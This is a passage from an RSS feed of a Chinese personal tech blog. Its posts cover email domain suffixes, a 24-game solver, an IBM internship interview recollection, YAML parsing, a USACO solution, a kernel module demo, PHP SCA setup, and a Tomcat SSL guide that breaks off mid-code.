<![CDATA[常见的电子邮箱有gmail, 163, qq 和 hotmail 邮箱，不常见的呢？来个邮箱地址后缀集合：<br>按拼音顺序排列，共53个<br>@126.com<br>@139.com<br>@163.com<br>@act.buaa.edu.cn<br>@apex.sjtu.edu.cn<br>@baidu.com<br>@bit.edu.cn<br>@bjtu.edu.cn<br>@cic.tsinghua.edu.cn<br>@cse.buaa.edu.cn<br>@dsp.ac.cn<br>@emails.bjut.edu.cn<br>@foxmail.com<br>@fudan.edu.cn<br>@gmail.com<br>@hotmail.com<br>@icst.pku.edu.cn<br>@ict.ac.cn<br>@insun.hit.edu.cn<br>@ir.hit.edu.cn<br>@itechs.iscas.ac.cn<br>@jdl.ac.cn<br>@jokry.me<br>@live.cn<br>@mail.bnu.edu.cn<br>@mail.dlut.edu.cn<br>@mail.scut.edu.cn<br>@mail.sdu.edu.cn<br>@mails.thu.edu.cn<br>@mails.tsinghua.edu.cn<br>@mail.ustc.edu.cn<br>@msn.cn<br>@msn.com<br>@nlpr.ia.ac.cn<br>@nlsde.buaa.edu.cn<br>@qq.com<br>@sict.ac.cn<br>@sina.cn<br>@sina.com<br>@sjtu.edu.cn<br>@sjtuer.net<br>@snadn.cn<br>@sohu.com<br>@stuhome.com<br>@stu.xjtu.edu.cn<br>@tom.com<br>@vip.163.com<br>@vip.qq.com<br>@yahoo.cn<br>@yahoo.com.cn<br>@yaotaiyang.com<br>@yeah.net<br>@zju.edu.cn]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010102683928712/</guid>
    </item>
    <item>
      <title>
<![CDATA[晚安，2010 - hankjin的2010纪念册]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010113171240757/</link>
      <description>
<![CDATA[<div style="width:720px;margin: 0 auto;"><embed height="520" flashvars="uname=hankjin@163.com" width="700" allowfullscreen="false" allowScriptAccess="always" invokeurls="false" src="http://blog.163.com/newpage/images/annualstat/swf/BlogViewBook.swf?1002" type="application/x-shockwave-flash" wmode="transparent"></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010113171240757/</guid>
    </item>
    <item>
      <title>
<![CDATA[暴力计算24点问题]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720091113819754/</link>
      <description>
<![CDATA[#!/usr/bin/python<br>page='''<br>&lt;form method=get&gt;<br>a:&lt;input type=text name=a value=%s&gt;&lt;br/&gt;<br>b:&lt;input type=text name=b value=%s&gt;&lt;br/&gt;<br>c:&lt;input type=text name=c value=%s&gt;&lt;br/&gt;<br>d:&lt;input type=text name=d value=%s&gt;&lt;br/&gt;<br>&lt;input type=submit vlaue='Submit'&gt;<br>&lt;/form&gt;<br>'''<br>def index(req,a='3',b='3',c='8',d='8'):<br>&nbsp;&nbsp;&nbsp; req.content_type='text/html;charset=utf8'<br>&nbsp;&nbsp;&nbsp; req.write(page % (a,b,c,d))<br>&nbsp;&nbsp;&nbsp; result=cons([[float(a),a],[float(b),b],[float(c),c],[float(d),d]])<br>&nbsp;&nbsp;&nbsp; ans=[]<br>&nbsp;&nbsp;&nbsp; for x in result:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if abs(x[0]-24)&lt;0.01 and x[1] not in ans:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write('24=%s&lt;br/&gt;' % x[1])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ans.append(x[1])<br>def situs(i,j):<br>&nbsp;&nbsp;&nbsp; result=[<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [i[0]+j[0],'(%s+%s)' % (i[1],j[1])],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [i[0]-j[0],'(%s-%s)' % (i[1],j[1])],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [j[0]-i[0],'(%s-%s)' % (j[1],i[1])],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [i[0]*j[0],'(%s*%s)' % (i[1],j[1])]]<br>&nbsp;&nbsp;&nbsp; if not i[0]==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.append([j[0]/i[0],'(%s/%s)' % (j[1],i[1])])<br>&nbsp;&nbsp;&nbsp; if not j[0]==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.append([i[0]/j[0],'(%s/%s)' % (i[1],j[1])])<br>&nbsp;&nbsp;&nbsp; return result<br>def cons(xs):<br>&nbsp;&nbsp;&nbsp; if len(xs)&lt;2:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return xs<br>&nbsp;&nbsp;&nbsp; result=[]<br>&nbsp;&nbsp;&nbsp; for i in range(len(xs)):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; newxs=cons(xs[0:i]+xs[i+1:])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for newx in newxs:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result.extend(situs(xs[i],newx))<br>&nbsp;&nbsp;&nbsp; return result<br>if __name__=='__main__':<br>&nbsp;&nbsp;&nbsp; res=cons([[3.0,'3'],[3.0,'3'],[8.0,'8'],[8.0,'8']])<br>&nbsp;&nbsp;&nbsp; for x in res:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if abs(x[0]-24)&lt;0.01:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print x[1]<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720091113819754/</guid>
    </item>
    <item>
      <title>
<![CDATA[CDL面试经历]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200772483822800/</link>
      <description>
<![CDATA[<P>8月14号，发现CDL招CICS team的正式员工，如获至宝，马上把精心准备的简历发了过去。15号就收到了邮件已阅的收条，没想到从此以后，黄鹤一去杳无讯，估计没戏了。</P>
<P>8月20号到本部去听讲座，随手打开邮箱，God，山重水复疑无路，柳暗花明又一村。收到了CDL19号发的实习面试通知：<SPAN style="FONT-SIZE: 0.75em; FONT-FAMILY: Arial">多谢你对我们的实习工作感兴趣。我们会在未来两到三周安排interview</SPAN>。</P>
<P>8月21号收到面试确认，22号下午2点左右，Manager的面试。就把MVS竞赛的工作停了一下，打算复习一下，毕竟好多东西都不记得了。可惜的是临时抱佛脚的习惯没有养成，这一天基本浑浑噩噩的就过去了。</P>
<P><BR>8月22号上午把CICS的课件复习了一遍，本来打算快两点的时候把电话旁边的那台电脑打开，打开课件，有些问题还能作弊一下。没想到下午1点就接到电话了，电脑都没打开，只好舍命陪君子了，而且interviewer还是两个人。</P>
<P>刚开始就研究生的问题讨论了好长时间。第一句就是你是研究生吗？我很不自信的说我是本科生，不过可以随时去实习任意长时间。然后说CDL多数是研究生，我说我正准备保研。他说也有一些本科生，faint，我说是否保研要到11月份最终确定，我可以在这段实习期间作决定，如果可以的话就不保研了。</P>
<P>整个面试过程没有面试经里出现的问题，个人信息基本都是在讨论的时候提到的，一个比较disturbing的问题就是，用英语说一下你的weakness，当时就麻了。这种主观性的问题我最头疼了，真想说：my weakness is that i am not good at talk about my weakness。他们大概也想到了，就说你可以先考虑一下，我想了一下就说：我不会唱歌，不会买衣服（感觉有点避重就轻^_^，不过绝非故意，希望interviewer不要因为这个BS我），然后他就问我，about close friends，因为我刚说过clothes，然后就误听成clothes friends了，然后就说i have no clothes friends，然后他好像还问了一句you have no close friends。面试之后我和阿木聊得时候才发现这个问题，狂汗。前几天看面试经的时候说不要冷场，可是几乎每个问题我回答完之后就有个小冷场，最后坚持了58分钟就over了，在面试官挂电话之前我听到两句很中庸的话：嗯，这个，这个。然后啪的一下，电话就挂掉了，如果能晚挂哪怕5秒钟呢。。。然后就觉得特别累，出去交了下网费，上超时买点东西，回来上网玩会儿飞信，一天就过去了。</P>
<P>面试的专业内容可谓五花八门，比较失败的几个地方有：你知道dump吗？COBOL的编译过程？（不记得了）其他的呢，比如C？（C的还行，预编译，中间代码，最终代码，代码优化，编译原理的7步），JCL的DS（没听清是disp还是ds，就当disp答了）怎么用的？disp，new/pass/delete/shr/old（后来想这个可能答非所问了），zOS的系统结果Architecture是怎么样的？（这个开学的时候讲过，现在不记得了）</P>
<P>你有没有自己找老师或者老师找你，然后促成什么事？CICS的Components？你有什么想学的主机技术？你用过WebService吗？WebService的关于安全，事务等高级属性你知道吗？你平常去了解一些新技术吗？你将来的目标？境界，你对Web2.0有什么了解吗？说白了，就是一个XMLHttpRequest，我自己写过那个简单的框架，后来用sf，恩sourceforge上的zk开源框架，zul脚本语言。。。你自学过什么，有什么想学但还没学的？JCA，想学IMS，RACF，什么时候可以开始实习？明天。</P>
<P>最后说到主机竞赛，参加实习就算IBM员工，就不能参加竞赛了，我的回复是可以放弃名额，但和他们做到底，我当时的想法是：不是为了比赛而比赛，而且有钱还是能分到的^_^，至于获奖证书我觉得实在没什么用。如果我已经进入CDL，获奖证书就更没用了。可惜我当时没有说我的想法，可能会被觉得有点假吧。唉，有时候，想法还是要说出来的好啊。</P>
<P>然后该我提问，1假期怎么安排？正式员工15天，实习生根据项目紧急程度决定；2学校的三方实习协议；3实习期间的导师；工资我没有问，本来打算等他们问我，然后准备了一套说辞的（我的实习工资要求只要够survive就行，而且我认为像IBM这样formal的公司会根据我的能力和对公司的贡献给我合适的级别的），可惜没用上。</P>
<P>总结一下：刚开始有点紧张，说话都不利索，5分钟后正式进入状态，天南地北，海扯胡聊，后来想了一下，和面试经上提到的interviewee要做80%的talking基本一致，事后想来，有点太肆无忌惮了，这和大学养成的坏习惯有关系，有几分张狂，刚开始太紧张了，后来太放松了。两个面试官都比较好，面试气氛比较和谐，中途被我愚蠢的回答搞笑两次，结束的时候应该更礼貌一些：非常感谢你们的面试机会，让我学到了很多东西，非常希望能和你们一起工作，谢谢。</P>
<P>自我评价：基础知识不扎实（关于zOS结构的东西没答上来），涉猎面颇广（有不会的，但没不知道的），学术态度不认真（态度不谦虚），英语水平比较滥（clothes和cloes不分）。</P>
<P>8月23号正式开始MVS竞赛的工作，可惜有些心不在焉，总是走神去想面试的事，能不能拿到offer，那些地方表现的不好，只好去调试程序去了，调试程序的时候我还能保持精神集中地。</P>
<P>当时面试的时候就应该去拿个MP3把电话录下来，然后再听几遍，这样的收获肯定要大得多，读万卷书，行万里路，这次面试收获非浅。<BR></P>
<P>8月23号去交大和吴凯，田天，魏征聚了一下，打算第二天去本部听讲座，晚上就住在交大，竟然做梦拿到offer了。第二天早上5点多就醒了，蚊子太猖獗了。结果24号听得DB2晕晕乎乎的，只听了一上午就回来了。</P>
<P>8月25号不停的用foxmail收邮件，一直到晚上才想起来，周六周日不上班。唉，等待的滋味越来越难受，对自己的信心越来越少，反思一下，可能当时太过自信了，许多问题都回答得很自负，藐视一切，谈到Web2.0的时候，我说：Web2.0就是一个XmlHttpRequest；多肤浅啊，如果是一个研究Web2.0的脾气不好的专家，估计立刻把我毙掉。许多问题说法不一样，但是对技术应该怀有敬畏之心，尤其是自己不太懂的。</P>
<P>我现在最怕的是已经被拒了，但CDL没打算通知我。等到下周二，如果还没消息的话，估计就是最怕的事情发生了。</P>
<TABLE cellSpacing=0 border=0>
<TBODY></TBODY></TABLE>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200772483822800/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用Python和Perl处理yaml]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720116354015490/</link>
      <description>
<![CDATA[yaml 是另一种标记语言，yet another markup language. 用缩进表示结构<br>sudo apt-get install python-yaml<br>sudo apt-get install libyaml-perl<br><br><b>1. test.yaml</b>(被copy了N多的一个例子)<br>name: Tom Smith&nbsp;&nbsp; <br>age: 37&nbsp; <br>spouse:&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; name: Jane Smith&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; age: 25&nbsp; <br>children:&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; - name: Jimmy Smith&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; age0: 15&nbsp; <br>&nbsp;&nbsp;&nbsp; - name1: Jenny Smith&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; age1: 12&nbsp; <br><br><b>2. test.py</b>(使用python处理), python可以将yaml加载成一个词典<br>import yaml<br>o=yaml.load(open('test.yaml'))<br>print o<br><br><b>3.test.pl</b>(使用perl处理), perl 有好个yaml处理库<br>use YAML;<br>$settings = YAML::LoadFile('test.yaml');<br>print Dump( $settings);]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720116354015490/</guid>
    </item>
    <item>
      <title>
<![CDATA[不要说自己忙]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720092168404569/</link>
      <description>
<![CDATA[&nbsp; 我们总在说自己忙, 如果要"每个星期抽出50个小时的空闲时间", 可能吗?<br>&nbsp; 没有什么不可以, 晚上8点开始工作,到2点,这是六个小时, 周一到周五 6*5=30; 周六从下午4点开始,到1点,这是9个小时,周日1天的时间, 减去休息的时间凑够11个小时还是没问题的.<br><br>&nbsp; 燃烧的青春,激情的岁月,生前何须久睡,死后自当长眠,ORZ<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720092168404569/</guid>
    </item>
    <item>
      <title>
<![CDATA[灵异，又见灵异USACO5.2]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720106802856881/</link>
      <description>
<![CDATA[第一次是GPU的Cg编程，里面用了一个while(true)，结果只循环了若干次，还没满足break的每件就退出了。又不会调试，百思不得其解，最后无奈下查Cg手册，终于发现是Cg编译器对while(true)进行优化，悄悄地把while(true)改成了一个循环。<br>今天又灵异了，USACO的5.2题fence3，用了一个递归函数，本机调试也通过，运行也成功了，可是一提交就报运行超时，万般无奈下加了一句计算递归层数的代码，结果竟然通过了！！！<br><b>&nbsp;&nbsp;&nbsp; if(++hjz&gt;1000){<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fout&lt;&lt;"Holishit"&lt;&lt;endl;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br>
&nbsp;&nbsp;&nbsp; }<br></b>很明显，从来没有执行到这里过，因为如果执行到这里，肯定答案会出错，但就是加了这么一句没用的代码，USACO就通过了，否则总报超时！！<br><br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;iomanip&gt;<br>#include &lt;climits&gt;<br>#include &lt;algorithm&gt;<br>#include &lt;cmath&gt;<br>using namespace std;<br><br>//mountain climbing, unable to prove it works, but it works.<br>//but it does NOT work in USACO<br>ifstream fin("fence3.in");<br>ofstream fout("fence3.out");<br>int N;<br>int midx,midy;<br>double best,oldlen;<br>struct point{<br>&nbsp;&nbsp;&nbsp; int sx,sy;<br>&nbsp;&nbsp;&nbsp; int ex,ey;<br>}p[150];<br>bool used[1000][1000];<br><br>struct d{<br>&nbsp;&nbsp;&nbsp; int x,y;<br>}dirs[8]={ {-1,-1},{-1,0},{-1,1}, {0,-1}, {0,1}, {1,-1},{1,0},{1,1}};<br><br>inline double dist(int ix,int iy){<br>&nbsp;&nbsp;&nbsp; double x = (double)ix/10,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; y = (double)iy/10;<br>&nbsp;&nbsp;&nbsp; double res=0;<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(p[i].sx&lt;x &amp;&amp; p[i].ex&gt;x){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res+=abs(p[i].sy-y);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if(p[i].sy&lt;y &amp;&amp; p[i].ey&gt;y){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res+=abs(p[i].sx-x);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double dx=min(abs(p[i].sx-x), abs(p[i].ex-x)),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dy=min(abs(p[i].sy-y), abs(p[i].ey-y));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res+=sqrt(dx*dx+dy*dy);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return res;<br>}<br>void mountainclimb(){<br>&nbsp;&nbsp;&nbsp; //current state<br>&nbsp;&nbsp;&nbsp; //Jessus, who can tell me what is the problem<br>&nbsp;&nbsp;&nbsp; static int hjz=0;<br><b>&nbsp;&nbsp;&nbsp; if(++hjz&gt;1000){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fout&lt;&lt;"Holishit"&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br>&nbsp;&nbsp;&nbsp; }</b><br>&nbsp;&nbsp;&nbsp; //<br>&nbsp;&nbsp;&nbsp; oldlen = best;<br>&nbsp;&nbsp;&nbsp; double temp;<br>&nbsp;&nbsp;&nbsp; int ix=midx, iy=midy;<br><br>&nbsp;&nbsp;&nbsp; int nx,ny;<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;8;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nx = ix+dirs[i].x;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ny = iy+dirs[i].y;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(nx&lt;0 || ny&lt;0 || nx==N*10 || ny==N*10 || used[nx][ny])//out<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; used[nx][ny]=true;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temp = dist(nx,ny);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(best &gt; temp){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; best = temp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; midx = nx;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; midy = ny;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(best &lt; oldlen){//better solution available<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mountainclimb();<br>&nbsp;&nbsp;&nbsp; }<br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; fin&gt;&gt;N;<br>&nbsp;&nbsp;&nbsp; double sumx=0, sumy=0;<br>&nbsp;&nbsp;&nbsp; int sx,sy,ex,ey;<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fin&gt;&gt;sx&gt;&gt;sy&gt;&gt;ex&gt;&gt;ey;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p[i].sx=min(sx,ex);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p[i].ex=max(sx,ex);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p[i].sy=min(sy,ey);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p[i].ey=max(sy,ey);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sumx+=p[i].sx+p[i].ex;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sumy+=p[i].sy+p[i].ey;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; best = INT_MAX;<br>&nbsp;&nbsp;&nbsp; midx=(int)(sumx*10/(2*N));<br>&nbsp;&nbsp;&nbsp; midy=(int)(sumy*10/(2*N));<br>&nbsp;&nbsp;&nbsp; best = dist(midx,midy);<br>&nbsp;&nbsp;&nbsp; used[midx][midy]=true;<br>&nbsp;&nbsp;&nbsp; mountainclimb();<br><br>&nbsp;&nbsp;&nbsp; //*/<br>&nbsp;&nbsp;&nbsp; double outx = (double)midx/10,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outy = (double)midy/10;<br>&nbsp;&nbsp;&nbsp; fout&lt;&lt;setprecision(1)&lt;&lt;setiosflags(ios::fixed)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;&lt;outx&lt;&lt;" "&lt;&lt;outy&lt;&lt;" "&lt;&lt;best&lt;&lt;endl;<br><br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br><br>测试数据<br>3<br>0 0 0 1<br>2 0 2 1<br>0 3 2 3]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720106802856881/</guid>
    </item>
    <item>
      <title>
<![CDATA[内核模块编程：传递参数]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009115113556432/</link>
      <description>
<![CDATA[代码面前，了无秘密，三个文件hellop.c Makefile test.sh<br>ps: hellop.c来自LDD3<br>命令：<br>$ make<br>$ chmod +x test.sh<br>$ sudo ./test.sh<br>================1. Makefile===========================<br>KERNEL_DIR=/lib/modules/·uname -r·/build<br>RM=rm -fr<br>obj-m:=hellop.o<br>default:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules<br>clean:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(RM) *.cmd *.mod.c *.o -r .tmp *.ko<br>================2. test.sh===========================<br>dmesg -c &gt; /dev/null<br>insmod hellop.ko<br>rmmod hellop<br>dmesg -c<br>insmod hellop.ko howmany=3<br>rmmod hellop<br>dmesg -c<br>insmod hellop.ko whom=hank<br>rmmod hellop<br>dmesg -c<br>insmod hellop.ko whom=hankjin howmany=4<br>rmmod hellop<br>dmesg -c<br>================3. hellop.c===========================<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>static char* whom = "world";<br>static int howmany = 1;<br><br>module_param(howmany,int,S_IRUGO);<br>module_param(whom,charp,S_IRUGO);<br><br>static int hello_init(void){<br>&nbsp;&nbsp;&nbsp; int i;<br>&nbsp;&nbsp;&nbsp; printk(KERN_ALERT "init: %d(%s)\n",howmany,whom);<br>&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; howmany; i ++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printk(KERN_ALERT "(%d) Hello, %s\n",i,whom);<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>static void hello_exit(void){<br>&nbsp;&nbsp;&nbsp; printk(KERN_ALERT "exit hellop\n");<br>}<br>module_init(hello_init);<br>module_exit(hello_exit);<br><br>MODULE_LICENSE("hpl");<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009115113556432/</guid>
    </item>
    <item>
      <title>
<![CDATA[enable SCA support of PHP]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200842131935379/</link>
      <description>
<![CDATA[1. download and install wamp from http://www.wampserver.com/en/download.php<br>2. download and extract SCA related php files from http://pecl.php.net/package/SCA_SDO<br>3. download sample project from http://www.ibm.com/developerworks/web/library/ws-soa-scasdo/index.html<br>4. configure php.ini (find it location via php_info()), include_path-&gt;SCA.php... extension=php_sdo.dll<br>5. http://localhost/sample/client.php<br>6. more<br>http://www.osoa.org/display/PHP/SCA+with+PHP#SCAwithPHP-documentation<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200842131935379/</guid>
    </item>
    <item>
      <title>
<![CDATA[配置Tomcat支持SSL,并用Java访问]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200710174342490/</link>
      <description>
<![CDATA[<P>1。首先查看机器名,在命令行下执行hostname，则返回机器名，如：</P>  <P>E:\programe&gt;hostname<BR>ssdut-hankjin</P>  <P>2。生成密钥，有三点注意：1，名字与姓氏必须与第一步得到的hostname相同，否则会抛出异常HTTPS hostname wrong:&nbsp; should be...；2，最后一步的&lt;tomcat&gt;密码要和keystore密码相同，直接按回车即可；3，最后生成的证书放在用户目录下C:/documents and setting/hankjin/.keystore</P>  <P>D:\programe\netbeans\enterprise3\apache-tomcat-5.5.17&gt;keytool -genkey -alias tomcat -keyalg RSA<BR>输入keystore密码：<BR>再次输入新密码:<BR>您的名字与姓氏是什么？<BR>&nbsp; [Unknown]：&nbsp; ssdut-hankjin<BR>您的组织单位名称是什么？<BR>&nbsp; [Unknown]：&nbsp; cdl<BR>您的组织名称是什么？<BR>&nbsp; [Unknown]：&nbsp; ibm<BR>您所在的城市或区域名称是什么？<BR>&nbsp; [Unknown]：&nbsp; huilg<BR>您所在的州或省份名称是什么？<BR>&nbsp; [Unknown]：&nbsp; beijing<BR>该单位的两字母国家代码是什么<BR>&nbsp; [Unknown]：&nbsp; cn<BR>CN=ssdut-hankjin, OU=cdl, O=ibm, L=huilg, ST=beijing, C=cn 正确吗？<BR>&nbsp; [否]：&nbsp; y</P>  <P>输入&lt;tomcat&gt;的主密码<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; （如果和 keystore 密码相同，按回车）：</P>  <P>3,把.keystore拷贝到CATALINA_HOME/conf文件夹下（如果不移动.keystore则不用下面的keystoreFile属性，修改CATALINA_HOME/conf/server.xml，取消下面一段注释，<BR>&nbsp;&nbsp;&nbsp; &lt;!-- Define a SSL HTTP/1.1 Connector on port 8443 --&gt;</P>  <P>并增加两行：<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; keystoreFile="D:/programe/netbeans/enterprise3/apache-tomcat-5.5.17/conf/.keystore" <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; keystorePass="whoyouare"/&gt;</P>  <P>4.重启Tomcat: <A rel="nofollow" href="https://localhost:8443/index.jsp"  >https://localhost:8443/index.jsp</A></P>  <P>5.客户端代码访问</P>  <P>import java.io.*;<BR>import java.net.*;<BR>import javax.net.ssl.*;<BR>import java.security.cert.*;</P>  <P>public class Test{<BR>&nbsp;public static void main(String args[])throws Exception{<BR>&nbsp;&nbsp;test();<BR>&nbsp;}<BR>&nbsp;public static void test() throws Exception{<BR>&nbsp;&nbsp;String trusted = "<A rel="nofollow" href="https://www.sun.com"  >https://www.sun.com</A>";<BR>&nbsp;&nbsp;String untrusted&nbsp; = "<A rel="nofollow" href="https://ssdut-hankjin:8443/index.jsp"  >https://ssdut-hankjin:8443/index.jsp</A>";<BR>&nbsp;&nbsp;String untrusted2 = 